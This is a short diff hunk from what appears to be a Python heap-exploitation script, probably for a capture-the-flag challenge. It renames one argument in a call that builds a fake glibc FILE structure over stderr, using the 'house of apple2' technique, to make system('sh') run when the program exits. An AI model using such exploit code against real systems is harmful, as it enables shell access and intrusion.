@@ -35,7 +35,7 @@ def exploit():
 
     fake_file = IO_FILE_plus_struct()
     payload = fake_file.house_of_apple2_execmd_when_exit(
-        standard_FILE_addr=_IO_2_1_stderr_,
+        fake_file_addr=_IO_2_1_stderr_,
         _IO_wfile_jumps_addr=_IO_wfile_jumps,
         system_addr=system,
         cmd="sh"
